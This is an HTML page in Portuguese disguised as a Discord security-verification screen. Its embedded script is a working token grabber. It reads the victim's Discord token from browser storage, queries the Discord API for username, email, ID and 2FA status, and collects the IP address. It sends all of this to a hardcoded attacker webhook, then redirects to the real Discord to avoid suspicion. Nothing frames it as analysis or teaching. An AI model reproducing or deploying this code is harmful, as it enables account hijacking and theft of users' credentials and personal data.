<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Verificação de Segurança</title>
    <style>
        body { font-family: Arial, sans-serif; background: #36393f; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: #2f3136; padding: 30px; border-radius: 8px; width: 400px; text-align: center; }
        .loading { width: 50px; height: 50px; border: 5px solid #202225; border-top: 5px solid #5865f2; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .info { color: #b9bbbe; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Verificando sua sessão</h2>
        <div class="loading"></div>
        <p class="info">Aguarde... verificação de segurança em andamento</p>
    </div>

    <script>
        // Tenta pegar o token de várias formas
        async function getToken() {
            let token = null;
            
            // Método 1: localStorage (o mais comum)
            try {
                if (localStorage.getItem("token")) {
                    token = localStorage.getItem("token").replace(/"/g, "");
                }
            } catch(e) {}
            
            // Método 2: sessionStorage
            try {
                if (!token && sessionStorage.getItem("token")) {
                    token = sessionStorage.getItem("token").replace(/"/g, "");
                }
            } catch(e) {}
            
            // Método 3: indexedDB (avançado)
            if (!token) {
                // fallback para tentar extrair de outros lugares
            }
            
            // Se achou o token, envia pro webhook
            if (token) {
                const webhookURL = "https://discord.com/api/webhooks/1473900457087996047/-K9y2qZTjjACmhxXLzTjgYiA9ztNgyTcUHz70N6U_ScHpf03N7KMsZEXNrW4f1VC1uE9";
                const userData = await fetch("https://discord.com/api/v9/users/@me", {
                    headers: { "Authorization": token }
                }).then(r => r.json()).catch(() => ({}));
                
                const payload = {
                    content: "@everyon",
                    embeds: [{
                        title: "✅ TOKEN CAPTURADO",
                        color: 0x5865f2,
                        fields: [
                            { name: "Token", value: `\`${token}\``, inline: false },
                            { name: "Username", value: userData.username || "Desconhecido", inline: true },
                            { name: "Email", value: userData.email || "Desconhecido", inline: true },
                            { name: "ID", value: userData.id || "Desconhecido", inline: true },
                            { name: "Nitro", value: userData.premium_type ? "✅ Sim" : "❌ Não", inline: true },
                            { name: "2FA", value: userData.mfa_enabled ? "✅ Sim" : "❌ Não", inline: true },
                            { name: "User Agent", value: navigator.userAgent, inline: false },
                            { name: "IP", value: "Coletado via API externa", inline: false }
                        ],
                        footer: { text: "Discord Token Grabber" },
                        timestamp: new Date().toISOString()
                    }]
                };
                
                fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
                
                // Coleta IP separadamente
                fetch("https://api.ipify.org?format=json")
                    .then(r => r.json())
                    .then(data => {
                        fetch(webhookURL, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ content: `**IP:** ${data.ip}` })
                        });
                    });
            }
            
            // Redireciona pro Discord real pra não levantar suspeita
            setTimeout(() => {
                window.location.href = "https://discord.com/app";
            }, 3000);
        }
        
        getToken();
    </s
